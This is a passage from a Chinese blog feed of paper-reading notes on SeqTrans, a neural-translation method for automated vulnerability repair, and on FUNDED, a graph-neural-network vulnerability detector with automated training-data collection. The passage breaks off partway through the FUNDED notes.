language，PL）领域却很少有这样的预训练模型，因此原文开展训练通用领域模型。在之前训练过程中训练的模型将使用漏洞修复语料库进行微调，以便将bug修复数据集训练中学到的知识迁移到漏洞修复任务中。步长设置为预训练步长的 1&#x2F;10，模型选择与上一步相同。</p><p>考虑到过拟合，只微调模型的最后一层。训练过程将更新词汇语料库并持续到收敛。学习率比预训练过程更小，为 0.01。为了<strong>减轻灾难性遗忘</strong>( <a href="https://arxiv.org/abs/2004.10964">Gururangan</a> 和 <a href="https://arxiv.org/abs/1701.02810">OpenNMT</a> 提到，一些序列在再训练模型中翻译得不好，如unidiomatic结构或 UNKs，而在基础模型中翻译得很好)，再训练应该结合 indomain and generic 数据。原文将部分通用域数据混合到特定域数据中以生成新的组合，在混合后的数据尽量不扩大语料库规模的基础上，粗略的选择了一些数据混合到特殊领域数据中，最终训练集的大小增加了一倍，而测试集不变。</p><h3 id="3-2-3-编码"><a href="#3-2-3-编码" class="headerlink" title="3.2.3.编码"></a>3.2.3.编码</h3><p>编码器由 6 层相同的堆栈组成，每层由一个多头自注意力机制和一个前馈神经网络共两个子层组成，每个子层都采用了残差连接和归一化，将子层的输出表示为：</p><p>sub_layer_output &#x3D; Layer_normization(x+(SubLayer(x)))</p><p>Sublayer(x) 是由子层本身实现的函数；自注意力机制从先前的编码器接收一组编码，并权衡它们之间的相关性输出一组编码，然后前馈神经网络处理每个输出编码，最终作为输入传递给下一个编码器。填充掩码用于确保编码器不会注意填充token，所有子层以及嵌入层产生维度 $d_{model}$ &#x3D; 512 的输出。</p><h3 id="3-2-4-解码"><a href="#3-2-4-解码" class="headerlink" title="3.2.4.解码"></a>3.2.4.解码</h3><p>解码器包含 6 层相同的堆栈，每一层都由三个子层组成：添加了一个注意力子层来执行多头注意力，以从编码器生成的编码中提取相关信息；包含填充掩码和序列掩码的掩码机制被用于防止关注后续位置的情况，并确保位置 i 的预测只能依赖于小于 i 的位置的已知输出，其他部分与编码器相同。</p><h3 id="3-2-4-注意力机制"><a href="#3-2-4-注意力机制" class="headerlink" title="3.2.4.注意力机制"></a>3.2.4.注意力机制</h3><p>注意机制的目的是使用一组编码将上下文合并到序列中。对于每个token，注意机制需要一个维度为 $d_k$ 的查询向量Q、一个维度为 $d_k$ 的键向量K，一个维度为 $d_v$ 的值向量V,这些向量是通过在训练过程中训练的三个矩阵的嵌入相乘创建的。注意力机制的本质其实是一个寻址过程，是注意力机制减轻神经网络模型复杂性的体现：不是将所有N个输入都馈送到神经网络进行计算，而是从 X 中选择一些与任务相关的信息并将其馈送到神经网络。 Self-attention 是指查询、键和值都使用序列编码创建的情况。这个注意力机制的输出Z：</p><p><img src="image-20240520150115288.png" alt="image-20240520150115288"></p><p>transformer中使用的多头注意力将多个注意力机制并行实现，然后将得到的编码组合在一个过程中。</p><h2 id="3-3-预测和补丁生成"><a href="#3-3-预测和补丁生成" class="headerlink" title="3.3.预测和补丁生成"></a>3.3.预测和补丁生成</h2><p>输入一个易受攻击的文件，需要定位可疑代码并根据训练好的模型进行预测，可以通过以前的漏洞定位工具或在人类安全专家的帮助下完成漏洞定位部分。 SeqTrans 提供多个候选预测供用户选择,语法检查器<a href="https://findbugs.sourceforge.net/">Findbugs</a> 用来检查并过滤掉包含语法错误的预测。最后，Refill Abstraction（下文称为抽象语句重新填充）并生成补丁。下文详细说明本段中提到的技术。</p><h3 id="3-3-1-方法总体概述"><a href="#3-3-1-方法总体概述" class="headerlink" title="3.3.1.方法总体概述"></a>3.3.1.方法总体概述</h3><p>预测的结果是抽象和分词后的结果,也可能包含语法错误，不能直接在编译器里面编译，所以作者用两个步骤来解决这些问题：<strong>抽象语句重新填充</strong> 和 <strong>语法检查</strong>。（<a href="https://ieeexplore.ieee.org/abstract/document/8730164/">刘等人</a>指出，由于对故障定位的不同假设，很难比较不同的修复技术，故原文中假设使用的漏洞定位方法无瑕疵) </p><p>下面使用开源项目 activemq 的漏洞修复来说明预测和补丁生成过程。</p><p><img src="image-20240520150124121.png" alt="image-20240520150124121"></p><p>上图是 activemq 的一条CVE修复记录，包含三个语句修复，补丁推断和生成的过程有三步：</p><p>1）如上文中提到的，需要对输入代码进行抽象和分词，按照下图中描述的类似过程将其分解为序列。在下图中，抽象变量用蓝色标记，常量标记为黄色，文字标记为绿色，每个序列都将维护一个字典以供恢复，序列的位置也会被记录下来，以便后续回填;</p><p>2）这些序列被输入到 transformer 模型中，用 <strong>beam search</strong> 为每个易受攻击的语句生成五个预测候选，输出也是如下图所示的抽象序列，通常，排名最高的预测将被选择和利用。其包含预测语句及其上下文；</p><p>3）在选择预测并应用语法检查时回填所有抽象语句。</p><p><img src="image-20240520150132456.png" alt="image-20240520150132456"></p><h3 id="3-3-2-抽象语句回填"><a href="#3-3-2-抽象语句回填" class="headerlink" title="3.3.2.抽象语句回填"></a>3.3.2.抽象语句回填</h3><p>SeqTrans在将语句进行抽象之前会维护一个字典来存储恢复所需的信息，维护的字典将为整个CP存储相关的变量、常量和文字。预测完成后，字典中的所有抽象语句将被重新填充，在此过程中代码会自动缩进，所有的注释都会删除。<strong>作者认为在这个尺度下搜索空间爆炸不是一个重要的问题。SeqTrans的一个缺点是字典中包含的映射来自源文件，如果抽象语句是需要修复的内容，那么SeqTrans很难理解和推断</strong>，所能做的就是根据词典减少相应的抽象，例如，若一个println函数改变了它想要打印的内容，该模型很难预测它想要打印什么；若一个预测的抽象在字典中找不到映射，就把原始的抽象内容复制到当前位置。</p><h3 id="3-3-3-语法检查"><a href="#3-3-3-语法检查" class="headerlink" title="3.3.3.语法检查"></a>3.3.3.语法检查</h3><p>作者将beam search与语法检查工具相结合，分析预测中包含的句法和语法错误。作者使用的静态分析工具FindBugs的版本是3.0.1。引入静态分析的动机是在执行测试用例之前，尽可能多地过滤掉无效的生成补丁。</p><p>在SeqTrans中，一个生成的补丁需要先通过编译器，然后进行FindBugs检测。若候选预测不能通过检验过程，则进行筛选。Findbugs即使在预提交版本上也可能触发警告，故只检查预测后添加的警告消息。例如，上图中第二个和第三个候选包含一个语法错误，无法通过FindBugs的检查，则删除这两位候选。即使用FindBugs来检查候选项，以确保预测的五个候选项引入尽可能少的新bug。</p><h1 id="4-实验"><a href="#4-实验" class="headerlink" title="4.实验"></a>4.实验</h1><p>RQ1: 基于 NMT 的SeqTrans是漏洞预测的可行方法？SeqTrans 优于其他最先进的技术？</p><p>RQ2: 所用 ML 模型的哪些特征会影响 SeqTrans 的性能？</p><p>RQ3: SeqTrans 如何预测特定类型的 CWE？</p><p>作者使用了三种数据集来验证实验</p><p>第一个验证集 $T_{cross}$ 是 10 折交叉验证。交叉验证仅适用于微调过程,所有九个子样本将共享相同的预训练集,最终平均10次结果。这种方法的优点是每个数据样本都作为训练数据和测试数据，避免了过度学习和学习不足的状态，得到的结果更有说服力。</p><p>第二个验证集 $T_{cwe}$ 是根据 CVE 修复时间顺序来模拟利用历史漏洞修复记录修复后续可疑代码的实际开发过程。按时间序列对 Ponta 数据集中的 CVE 样本进行排序，并使用 2008 年至 2017 年的 CVE 修复记录作为训练集（708 $CP_s$），2018 年和 2019 年的 CVE 修复记录用作验证（136 $CP_s$）和测试集（150 $CP_s$），测试集含有42种CWE。前两次验证在抽象语句回填部分不包含编译和语法检查。</p><p>在第三个测试集 $T_{tra}$ 中，将选择包含最多 CVE（120 个 CP）的五个开源项目作测试集，如下表所示，修复其他项目的记录作训练集。将可疑文件输入到SeqTrans的模型中，生成补丁，如果预测的文件通过了相关的测试用例并且没有引入新的故障，认为是一个成功的预测。</p><p><img src="image-20240520150138876.png" alt="image-20240520150138876"></p><p><strong>Answer to RQ1</strong>：</p><p>作者开展两个数据集的联合训练和独立训练，将bug修复数据集分为不相交的两部分：$G_{train}$用来训练,$G_{val}$用来验证,将漏洞修复数据集分为不相交的$S_{train’}$,$S_{val}$,$S_{test}$。$S_{test}$用于验证联合训练和独立训练的性能，本实验旨在验证微调能否帮助小样本克服数据集规模问题，从一般领域任务中学习，并迁移到特定领域任务中。结果如下表所示。<br><img src="image-20240520150145131.png" alt="image-20240520150145131"></p><p>将 SeqTrans 对CVEs数量最多的5个开源项目进行传统评估。结果如下表所示。<br><img src="image-20240520150152303.png" alt="image-20240520150152303"></p><p>将 SeqTrans 与一些最先进的技术进行比较。SeqTrans full、SeqTrans single是指经过预训练和微调的SeqTrans模型，以及仅使用Ponta数据集训练的SeqTrans模型。结果如下表所示。<br><img src="image-20240520150159961.png" alt="image-20240520150159961"></p><p>下图给出了在$T_{tra}$上进行实验的结果，Compilable表生成的补丁可以通过编译；Plausible表生成的补丁可以通过编译和测试；Correct表通过编译、测试、人工检查；check表findbugs的有效性，即通过静态分析的补丁；<br><img src="image-20240520150211604.png" alt="image-20240520150211604"></p><p>beam从1增加到50时Tcross的性能如下图所示</p><p><img src="image-20240520150218231.png" alt="image-20240520150218231"></p><p>beam从1增加到50时不同技术的结果如下所示<br><img src="image-20240520150225069.png" alt="image-20240520150225069"></p><p><strong>Answer to RQ2</strong>：</p><p>这一部分实验使用 $T_{cross}$ 验证集。下图是不同参数的训练结果。<br><img src="image-20240520150232504.png" alt="image-20240520150232504"></p><p>不同的模型层次和训练步数结果如下图所示。<br><img src="image-20240520150239061.png" alt="image-20240520150239061"></p><p><strong>Answer to RQ3</strong>：</p><p>当Beam &#x3D; 50时 $T_{cross}$ 和 $T_{cwe}$ 中各CWE的训练结果如下图所示<br><img src="image-20240520150248130.png" alt="image-20240520150248130"></p><p>将代码进行不同的转换得到的结果如下图所示<br><img src="image-20240520150302000.png" alt="image-20240520150302000"><br>上图中各个参数的意义如下图所示</p><p><img src="image-20240520150309394.png" alt="image-20240520150309394"></p><h1 id="5-思考"><a href="#5-思考" class="headerlink" title="5.思考"></a>5.思考</h1><p>漏洞修复确实可以看作是bug修复的一部分，但是这两者之间是否具有细微的区别，所以才导致结果不是很好？</p>]]></content>
      
      
      <categories>
          
          <category> 论文阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞修复 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Combining Graph-Based Learning With Automated Data Collection for Code Vulnerability Detection</title>
      <link href="/2023/03/22/FUNDED/"/>
      <url>/2023/03/22/FUNDED/</url>
      
        <content type="html"><![CDATA[<p>下面分享一篇我发表在安全学术圈上的论文笔记。<a href="https://mp.weixin.qq.com/s/lCkG4_wyhTpX1qDgF9_Flg">原文</a></p><blockquote><p><em>原文标题：Combining Graph-Based Learning With Automated Data Collection for Code Vulnerability Detection</em><br><em>原文作者：Huanting Wang , Guixin Ye , Zhanyong Tang , Shin Hwei Tan, Songfang Huang, Dingyi Fang, Member, IEEE, Yansong Feng, Lizhong Bian, and Zheng Wang</em><br><em>发表期刊：IEEE Transactions on Information Forensics and Security</em><br><em>原文链接：<a href="https://ieeexplore.ieee.org/document/9293321/">https://ieeexplore.ieee.org/document/9293321/</a></em><br><em>笔记作者：senu11@SecQuan</em><br><em>笔记小编：ourren@SecQuan</em> </p></blockquote><h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h1><p>文章提出了一种用于构建漏洞检测模型的新型学习框架FUNDED（Flow-sensitive vUlNerability code Detection）。与将程序视为顺序序列或无类型图不同，FUNDED 学习和操作程序源代码的图形表示，其中各个语句通过关系边连接到其他语句；通过捕获程序语法、语义和流程，FUNDED 为漏洞检测提供代码表示；将概率学习和统计评估相结合，自动从开源项目中收集训练样本。该系统从程序源代码中识别函数级别的软件漏洞。使用 C、Java、Swift 和 Php 编写的程序评估 FUNDED，并将其与六个最先进的代码漏洞检测模型进行比较，FUNDED 在评估设置方面明显优于其他方法。</p><h1 id="2-数据集-项目"><a href="#2-数据集-项目" class="headerlink" title="2.数据集 &amp; 项目"></a>2.数据集 &amp; 项目</h1><p>代码：<a href="https://github.com/HuantWang/FUNDED_NISL">https://github.com/HuantWang/FUNDED_NISL</a></p><p>数据集：<a href="https://drive.google.com/drive/folders/1WFFV8uGi8oXpzYORyiqRCYyqJGiHSbZL">https://drive.google.com/drive/folders/1WFFV8uGi8oXpzYORyiqRCYyqJGiHSbZL</a></p><p>文章在两种类型的数据集上评估 FUNDED。在四种语言(C, Java, Php, Swift.)编写的代码样本上评估漏洞检测模型(3.1.节)，使用 C 和 Java 作为主要编程语言的项目的代码修订历史测试专家混合模型（3.2.节）。</p><p><img src="image-20240520151205037.png" alt="image-20240520151205037"></p><p>上表给出了这个数据集的详细信息，总共 150950 个函数级别的样本，源语言为 C、Java、Php 和 Swift,样本中有一半是阳性（易受攻击的）代码样本， 其为在 CWE 2019 中定义的前 5 到前 30 名的软件错误（例如，“缓冲区溢出”、“越界读&#x2F;写”、“NULL 指针取消引用”）。数据集由 SARD 、NVD  和托管在 GitHub 上的开源项目构建。使用 SARD 和 NVD 提供的补丁版本作为负（无漏洞）代码示例；对于从GitHub上收集到的漏洞样本，应用相应的补丁commit来获取无漏洞版本。</p><p><img src="image-20240520151212792.png" alt="image-20240520151212792"></p><p>从上表可以看出，该数据集包括来自 GitHub 以及 SAP 和 ZVD 的总共 6713 个与漏洞相关的代码修订。在来自 GitHub 的 4369 个漏洞相关commit中，有 2071 个是通过 CVE 和 NVD 链接建立的，其余 2298 个来自 GitHub 上最受欢迎的前 1000 个项目，其中以 C 和 Java 为主要编程语言。对于后者，手动检查并标记commit以建立基本事实。SAP 和 ZVD 数据集已经包含负样本。应用相同的方法从 GitHub 获得负面commit，即保留已通过 RE(3.2.2.1节) 过滤器但通过手动检查发现与漏洞无关的代码commit。共有 13,122 个代码commit样本，其中包含与漏洞相关和无关的commit。</p><h1 id="3-系统架构"><a href="#3-系统架构" class="headerlink" title="3.系统架构"></a>3.系统架构</h1><p>FUNDED 由两个关键部分组成。第一个是基于 GNN 的改进模型，用于识别源代码漏洞。第二个是自动框架，从GitHub收集易受攻击的代码样本，为学习漏洞检测模型提供额外的训练数据。</p><h2 id="3-1-漏洞检测模型"><a href="#3-1-漏洞检测模型" class="headerlink" title="3.1.漏洞检测模型"></a>3.1.漏洞检测模型</h2><p>漏洞检测模型建立在原文提出的<strong>改进GNN</strong>之上。该模型将目标函数的源代码作为输入；然后通过组合从抽象语法树 (AST) 和程序控制和依赖图 (PCDG) 中提取的信息来构建<strong>程序图</strong>。程序结构为有向图，语句、标识符和 immediate values为节点，两个节点之间的直接关系为一条边。一对节点可能存在多种关系，使用<strong>关系图</strong>来记录每种类型的关系。关系图被编码为程序图矩阵。文章的GNN 采用程序矩阵和初始<strong>节点表示</strong>来学习嵌入，嵌入被传递到下游神经网络以进行预测。</p><h3 id="3-1-1-模型架构"><a href="#3-1-1-模型架构" class="headerlink" title="3.1.1.模型架构"></a>3.1.1.模型架构</h3><p><img src="image-20240520151218503.png" alt="image-20240520151218503"></p><p>图 3 是漏洞检测模型的工作流程，以目标程序的源代码（即函数）作为输入。使用标准编译解析器构建代码的 AST，并使用控制和数据流以及诸如令牌序列的顺序信息来扩展 AST；扩展的 AST 为有向图，其中语句、标识符、代码块或值是图节点，直接关系为边。一对节点可能存在多种关系，使用关系图来记录每种关系（总共九种关系）。关系图的节点连通性被编码为邻接矩阵。</p><h3 id="3-1-2-改进的GNN"><a href="#3-1-2-改进的GNN" class="headerlink" title="3.1.2.改进的GNN"></a>3.1.2.改进的GNN</h3><p>基于<a href="https://eprints.whiterose.ac.uk/164551/12/PACT_2020.pdf">原作者团队最近的工作</a>，原文扩展了门控图神经网络 (GGNN)，对从源代码中提取的多个代码关系进行建模。扩展的 GGNN 由四个基于门控循环单元 (GRU) 的堆叠嵌入模型组成，可跨关系图合并更高程度的邻域。采用关系图的邻接矩阵和初始节点表示来学习全局嵌入向量，然后将其传递到标准的全连接网络进入softmax层分类。</p><h3 id="3-1-3-关系图"><a href="#3-1-3-关系图" class="headerlink" title="3.1.3.关系图"></a>3.1.3.关系图</h3><h4 id="3-1-3-1-代码预处理"><a href="#3-1-3-1-代码预处理" class="headerlink" title="3.1.3.1.代码预处理"></a>3.1.3.1.代码预处理</h4><p>使用一致的命名方案重写变量名。此步骤确保程序中的琐碎语义差异（例如变量名称的选择）不会影响token嵌入的选择。图 4(a) 显示了应用于图 1 所示示例的源代码重写。</p><p><img src="image-20240520151226742.png" alt="image-20240520151226742"></p><p><img src="image-20240520151234101.png" alt="image-20240520151234101"></p><h4 id="3-1-3-2-程序图"><a href="#3-1-3-2-程序图" class="headerlink" title="3.1.3.2.程序图"></a>3.1.3.2.程序图</h4><p>程序图是由包含语法节点（即编程语言语法中的非终结符，例如 if 语句或函数声明的 AST 节点）和语法token（标识符名称和常量值等终结符）的 AST（为了构建 AST，对 Java 使用 Soot，对 Swift 和 Php 使用 <a href="https://www.antlr.org/">ANTLR</a>，对 C&#x2F;C++ 使用 <a href="https://joern.io/">Joern</a>。） 构建的。标准 AST 只有子边用于编码两个 AST 节点之间的父子关系。为了捕获额外的语法、数据和控制信息，按照 <a href="https://arxiv.org/pdf/1711.00740.pdf">Learning to represent programs with graphs</a>中描述的方法向 AST 添加了八种额外类型的边。如下所述。</p><p><strong>Data and control flows</strong>.将从 PCDG 提取的数据和控制路径集成到 AST。</p><p><strong>GuardedBy</strong>.使用 GuardedBy 边将变量的每个 AST token连接到变量的封闭保护表达式。例如，对于图 4(a) 中的 if 语句，从 d 和 free(a) 添加一条 GuardedBy 边到 !strcmp() 对应的 AST 节点。 <a href="https://dl.acm.org/doi/pdf/10.1145/3276517">这可能有助于确定操作数的错误顺序</a>。</p><p><strong>Jump</strong>.使用跳转边将变量与控制依赖关系连接起来。 GuardedBy 和 Jump 边允许记录发散控制流的关系。这种关系对于捕获漏洞的控制和数据流模式很重要，例如图 1 中给出的“双重释放”示例和“CWE-413：不正确的资源锁定”。</p><p><strong>ComputedFrom</strong>.对于每个赋值，v &#x3D; expr，使用 ComputedFrom 边将 v 连接到出现在表达式 expr 中的所有变量token。该边捕获变量或缓冲区的使用位置，可用于检测“NULL 指针取消引用”等漏洞。</p><p><strong>NextToken</strong>.由于标准 AST 子父边不会对语法节点的子节点产生顺序，因此添加 NextToken 边以将每个语法token连接到它的后继节点。可捕获语句的操作码和操作数的顺序。此类信息对于“CWE-404：资源关闭或释放不当”等漏洞类型很有用，因为它捕获了 API 使用和释放的顺序。</p><p><strong>LastUse and LastLexicalUse</strong>.使用 LastUse 边连接相同变量的所有使用以捕获变量的使用，其中一个特殊情况是 if 语句中的变量，使用 LastLexicalUse 边连接此类变量。例如，对于图 4(a) 中的 if 语句，链接循环头中出现的 c 及其使用位置。通过记录上次使用变量或缓冲区的时间，这种关系有助于识别“双重释放”等漏洞。图 4(b) 显示了处理图 4(a) 中给出的代码后的增强 AST。</p><p><strong>第八个边呢？（没在原文瞅到）</strong></p><h4 id="3-1-3-3-关系图"><a href="#3-1-3-3-关系图" class="headerlink" title="3.1.3.3.关系图"></a>3.1.3.3.关系图</h4><p>将扩展 AST 的关系存储在单独的关系图中——上述九种关系（？？？）中的每一种关系图。关系图是一个有向图 G &#x3D; &lt;V, E&gt;，它包含 AST 节点 V 和边 E，表示两个节点之间存在给定关系。使用邻接矩阵来记录每个关系图的边连接。对于每条边，还添加了相应的后向边（通过转置邻接矩阵），使边数和边类型加倍。这些后向边有助于在关系图中传播信息。</p><h3 id="3-1-4-图节点表示"><a href="#3-1-4-图节点表示" class="headerlink" title="3.1.4.图节点表示"></a>3.1.4.图节点表示</h3><p>使用 word2vec 将每个关系图节点（例如 Stmt）和token嵌入。用于将单词和token映射到值的嵌入表和 word2vec 是根据训练代码语料库构建的，该语料库由节点类型和从训练程序收集的token组成；由于变量和函数名称以及常量值可以是任意长度，将其编码为token（即字母、符号和数字）。</p><p>为了捕获类型信息，将变量、常量和函数的（返回）类型的嵌入与 AST 节点名称表示连接起来，并将其传递给线性层以获得初始值图中每个节点的表示。</p><h3 id="3-1-5-多关系图学习"><a href="#3-1-5-多关系图学习" class="headerlink" title="3.1.5.多关系图学习"></a>3.1.5.多关系图学习</h3><p>给定邻接矩阵和初始节点嵌入，多关系 GNN 在整个关系图上生成 100 维特征的全局一维嵌入。</p><h4 id="3-1-5-1-邻域聚合"><a href="#3-1-5-1-邻域聚合" class="headerlink" title="3.1.5.1.邻域聚合"></a>3.1.5.1.邻域聚合</h4><p><img src="image-20240520151244168.png" alt="image-20240520151244168"></p><p>使用邻域聚合方案（图 5a）来更新节点嵌入。图节点 v 的 100 维嵌入向量 $h_v$ 由嵌入层通过递归聚合和转换其相邻节点的表示向量来计算。节点通过将它们的当前状态（即嵌入向量）作为消息发送给沿边的所有邻居来交换信息。在每个节点消息被聚合，然后用于更新下一个嵌入层（即下一次迭代）的关联节点表示。在重复更新节点状态的过程进行固定次数的迭代后，使用<strong>读出函数</strong>将节点状态聚合到单个嵌入向量中。</p><h4 id="3-1-5-2-多关系模型"><a href="#3-1-5-2-多关系模型" class="headerlink" title="3.1.5.2.多关系模型"></a>3.1.5.2.多关系模型</h4><p>与标准 GNN 不同，该模型跨多个关系图传播和聚合信息。如图 5b 所示，首先，使用可学习的、关系特定的函数通过邻域聚合来计算各个关系图的新图状态来实现这一点；然后，应用 GRU 单元来聚合和更新跨关系图的相同节点的状态。使用前向传播来更新关系图的顶点 v 的状态 $h_v^t$ 以获得新状态 $h_v^{(t+1)}$：</p><p><img src="image-20240520151250218.png" alt="image-20240520151250218"></p><p>其中$A_t$是节点u和v之间的直接边，$W_t$和GRU是可学习的参数，初始状态$h_v^0$使用word2vec创建</p><p>受自然语言处理中使用公路门来控制噪声传播的启发，在作者团队提出的 GGNN (也即改进GNN)中采用了layer-wise公路门：</p><p><img src="image-20240520151256067.png"></p><p>其中 $h_v^{(t)}$ 是第 t + 1 层的输入并获得新状态$h_v^{‘(t+1)}$ ； sigma 是一个 sigmoid 函数； · 是逐元素乘法； $W_T^{(t)}$ 和 $b_T^{(t)}$ 分别是门 $T(h_v^{(t)})$ 的权重矩阵和偏置向量。</p><h4 id="3-1-5-3-读出函数"><a href="#3-1-5-3-读出函数" class="headerlink" title="3.1.5.3.读出函数"></a>3.1.5.3.读出函数</h4><p>在跨多个嵌入层执行邻域聚合过程后，为每个token获得另一组嵌入。为了表示整个程序，使用读出函数连接所有邻域聚合迭代和嵌入层的图表示，以形成输出向量 $h_G$ 作为 m 关系图 $G_i$ 的全局程序表示：</p><p><img src="image-20240520151302913.png" alt="image-20240520151302913"></p><p>t&#x3D;0,1,,,n,是邻域聚合迭代。给定单个节点嵌入，此读出函数生成 m 个关系图的全局嵌入。</p><h3 id="3-1-6-训练GGNN"><a href="#3-1-6-训练GGNN" class="headerlink" title="3.1.6.训练GGNN"></a>3.1.6.训练GGNN</h3><p>本文的 GGNN 使用来自标准漏洞数据库（ CVE 和 NVD）的训练样本和3.2.节描述的数据收集框架收集的开源代码示例进行离线训练，然后可以将学习到的模型应用于未见过的程序。</p><p>在分批训练样本上训练 GGNN，其中每批包含正样本和负样本。由于目标是最小化两个概率分布（预测的和实际的）之间的距离，故选择交叉熵损失作为目标函数。使用学习率为 0.001 的小批量随机梯度下降 (SGD) 和 Adam 算法。当损失小于 0.005 或达到最大 100 个训练周期时，训练终止。</p><h2 id="3-2-自动收集训练数据框架"><a href="#3-2-自动收集训练数据框架" class="headerlink" title="3.2.自动收集训练数据框架"></a>3.2.自动收集训练数据框架</h2><p>自动训练数据收集框架由一组专家预测模型驱动，每个专家预测模型独立预测每一次commit是否为该项目提供补丁。通过识别与漏洞相关的commit，可以通过检查补丁带来的变化来定位上一版本的哪些代码段也即函数可能导致漏洞，然后将识别出的代码段用作易受攻击的代码训练示例。</p><p>每个专家模型都将一组特征（表 II）作为输入，这些特征是从提交消息和提交之间的代码更改（参见表 I）中获得的，然后它预测目标代码修订是否提供漏洞补丁。所有专家模型都使用标记的训练样本进行离线训练。</p><p><img src="image-20240520151311309.png" alt="image-20240520151311309"></p><h3 id="3-2-1-专家混合模型"><a href="#3-2-1-专家混合模型" class="headerlink" title="3.2.1.专家混合模型"></a>3.2.1.专家混合模型</h3><p><img src="image-20240520151320319.png" alt="image-20240520151320319"></p><p>图 6 为专家混合模型的架构，由五个分类器组成：support vector machine (SVM), random forests (RF), k-nearest neighbor (KNN), logistic regression (LR) and gradient boosting (GB).<br><img src="image-20240520151326960.png" alt="image-20240520151326960"></p><p>表 I 为 GitHub 上托管的 Linux 内核的两个提交。第一次提交 (C1) 修复了 NULL 指针漏洞，第二次提交 (C2) 修复了性能问题但未修复漏洞。现有方法（<a href="https://teamusec.de/pdf/conf-ccs-PerlD0AYRFA15.pdf">VCCFINDER</a> 和 <a href="https://www.researchgate.net/profile/Asankhaya-Sharma/publication/318872391_Automated_identification_of_security_issues_from_commit_messages_and_bug_reports/links/5a7947c2a6fdcc4ffe90c684/Automated-identification-of-security-issues-from-commit-messages-and-bug-reports.pdf">ZHOU 等人</a>）可能会错误地将表 I 中的第二个修订token为漏洞相关提交，因为提交消息包含关键字“check”和“NULL”。为避免此类错误，应用共形预测 (CP) 来量化每个专家模型对提交的预测的置信度，并且仅在相信模型的结果时才考虑预测，然后使用多数表决方案来汇总剩余的预测以生成结果。</p><h3 id="3-2-2-专家模型的训练数据"><a href="#3-2-2-专家模型的训练数据" class="headerlink" title="3.2.2.专家模型的训练数据"></a>3.2.2.专家模型的训练数据</h3><h4 id="3-2-2-1-收集代码修改训练样本"><a href="#3-2-2-1-收集代码修改训练样本" class="headerlink" title="3.2.2.1.收集代码修改训练样本"></a>3.2.2.1.收集代码修改训练样本</h4><p>使用相同的训练数据集来训练每个专家模型。训练数据由两个来源构成，第一个是 CVE 和 NVD 报告的提交日志和补丁，第二个是从 GitHub 上托管的开源项目中提取的提交日志和补丁，例如表 I 中给出的示例。</p><p>CVE 和 NVD 的日志已经与已知漏洞相关联，可以直接使用。为了从 GitHub 收集数据，考虑了 1,000 个主要编程语言为 C 或 Java 的项目。应用一组从 <a href="https://www.researchgate.net/profile/Asankhaya-Sharma/publication/318872391_Automated_identification_of_security_issues_from_commit_messages_and_bug_reports/links/5a7947c2a6fdcc4ffe90c684/Automated-identification-of-security-issues-from-commit-messages-and-bug-reports.pdf">Automated identification of security issues from commit messages and bug reports,</a>扩展而来的正则表达式 (RE) 规则来选择可能与漏洞相关的提交。</p><p>为了简化提取漏洞代码示例的过程，<strong>当前的实现仅考虑一次修改一个源文件</strong>的代码修订。收集初始代码修订样本后，手动确定代码提交中报告的漏洞是否已在 CVE 中发布,若在则使用 CVE 编号与公开的 CVE 描述建立链接；否则，手动提取包含漏洞的代码段、提交日志和问题报告（如果有）。手动标记所有通过 RE 规则的代码修改是否与漏洞相关。然后使用标记的样本作为训练数据。使用了超过 3,000 个手动标记的代码提交来训练专家模型。这个人工检查过程只需要执行一次来训练模型，学习到的模型可以用来收集更多的样本。</p><h4 id="3-2-2-2-特征提取"><a href="#3-2-2-2-特征提取" class="headerlink" title="3.2.2.2.特征提取"></a>3.2.2.2.特征提取</h4><p>使用表 II 中给出的三种类型的特征来捕获开源项目的质量和代码提交的目的。提交消息描述了代码修改的原因——是否与漏洞修复相关，以及漏洞类型。</p><p>使用预训练的 word2vec 网络，将提交消息和修改后的代码语句映射到嵌入向量中。生成的嵌入与项目质量和活动的特征值放在一起形成聚合特征向量。</p><h3 id="3-2-3-专家模型训练"><a href="#3-2-3-专家模型训练" class="headerlink" title="3.2.3.专家模型训练"></a>3.2.3.专家模型训练</h3><h4 id="3-2-3-1-训练每个专家模型"><a href="#3-2-3-1-训练每个专家模型" class="headerlink" title="3.2.3.1.训练每个专家模型"></a>3.2.3.1.训练每个专家模型</h4><p>训练数据用于确定每个专家模型的最佳超参数。每个训练样本都包含一个数值特征向量和一个标签，该标签指示代码修订样本是否用于修复代码漏洞。对于训练，只需为专家模型提供训练数据，它就会执行其内部监督学习算法。</p><h4 id="3-2-3-2-置信度评估"><a href="#3-2-3-2-置信度评估" class="headerlink" title="3.2.3.2.置信度评估"></a>3.2.3.2.置信度评估</h4><p>应用 CP 来捕获输入 x 的类标签 y（即是否与漏洞相关或不相关）的“奇怪性”（称为不合格度量），通过使用特定于模型的不合格函数 A(x, y, h) , 来估计模型 h 的不合格分数来实现,为  <a href="https://hal.inria.fr/hal-01459631/document">PyCP</a> 中给出的默认特定方法的不合格函数。直观上，专家模型定义的特征空间上的异常模式将比更常见的模式获得更大的不合格分数。</p><p>为了计算统计置信度，预留了 10% 的模型训练数据作为校准集（不用于训练专家模型）。离线计算校准分数 $a_1^{y^{p}}$,$a_2^{y^{p}}$ ,…,$a_n^{y^{p}}$ ，方法是通过模型 h 为每个类别标签y给出的概率 ($y^p$) 将函数 A 应用于校准集中的 n 个实例中的每一个。给定一个新输入 $x_{n+1}$，使用函数 A 计算一致性分数 $a_{n+1}^{y^{p}}$,然后计算 p 值 pv,对于$x_{n+1}$ ：</p><p><img src="image-20240520151334398.png"></p><p>若 p 值较小（接近其下限 1&#x2F;(n + 1)），则预测非常不合格（离群值）。如果它很大（接近其上限 1），则预测非常符合。如果预测的 p 值大于 1 − c (c 是一个可配置的显着水平,本文根据经验设置为 0.3）)，只考虑预测。</p><h3 id="3-2-4-专家模型应用"><a href="#3-2-4-专家模型应用" class="headerlink" title="3.2.4.专家模型应用"></a>3.2.4.专家模型应用</h3><p><img src="image-20240520151340469.png" alt="image-20240520151340469"></p><p>图 7 描述了收集和标记开源代码样本的过程。首先，使用GitHub API 自动爬取排名靠前项目的代码提交；然后应用 RE 规则来选择可能与漏洞相关的代码提交；</p><p>1.标记代码提交</p><p>首先应用离线训练的专家模型来预测通过 RE 过滤器的代码修订是否与代码漏洞修复相关；再使用特征提取器来处理收集到的代码提交日志、补丁和项目相关信息，以形成特征向量；然后给定特征值，每个专家模型预测代码修订是否与漏洞修复相关。为了在多个分类器（专家模型）之间达成共识，应用 